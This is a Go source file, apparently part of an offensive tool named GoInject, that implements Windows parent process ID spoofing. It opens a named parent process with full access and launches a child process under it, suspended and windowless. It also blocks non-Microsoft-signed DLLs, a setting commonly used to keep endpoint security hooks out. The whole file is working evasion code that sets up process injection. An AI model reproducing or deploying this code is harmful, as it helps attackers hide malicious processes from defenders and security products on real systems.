package spoof

import (
	"syscall"
	"GoInject/syscalls"
	"GoInject/structs"
	"unsafe"
	"GoInject/findPID"
	"golang.org/x/sys/windows"
)

var (
	kernel32           = windows.NewLazyDLL("kernel32.dll")
	GetProcessHeap = kernel32.NewProc("GetProcessHeap")
    HeapAlloc = kernel32.NewProc("HeapAlloc")
    HeapFree  = kernel32.NewProc("HeapFree")
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = uintptr(0x100000000000)
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x20007
)


func SpoofParent(pProcess string, cProcess string){
	//program paths UTF16
	cProcessUTF16, _ := windows.UTF16PtrFromString(cProcess)

	//StartupInfoEx and ProcessInformation structs
	var siX structs.StartupInfoEx
    pi := windows.ProcessInformation{}

    var attributeSize uintptr 
    syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &attributeSize)
    heap, _, _ := GetProcessHeap.Call()

    attributeList, _, _ := HeapAlloc.Call(heap, 0, attributeSize)
    defer HeapFree.Call(heap, 0, attributeList)
    siX.AttributeList = (*structs.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
    syscalls.InitializeProcThreadAttributeList(siX.AttributeList, 2, 0, &attributeSize)

    //restrict the process from loading any non ms-signed dll
    syscalls.UpdateProcThreadAttribute(siX.AttributeList, 0, uintptr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY), &PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON, unsafe.Sizeof(PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON), 0, nil)

    //find pid for parent process

    ppid, _ := findPID.ProcessID(pProcess)

	pHandle, _ := syscall.OpenProcess(0x001F0FFF, false, ppid)

	uintptrpHandle := uintptr(pHandle)

	syscalls.UpdateProcThreadAttribute(siX.AttributeList, 0, structs.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintptrpHandle, unsafe.Sizeof(pHandle), 0, nil)

	siX.Cb = uint32(unsafe.Sizeof(siX))
	siX.Flags = windows.STARTF_USESHOWWINDOW
	creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
	syscalls.CreateProcess(cProcessUTF16 , nil, nil, nil, true, uint32(creationFlags), nil, nil, &siX, &pi)
}
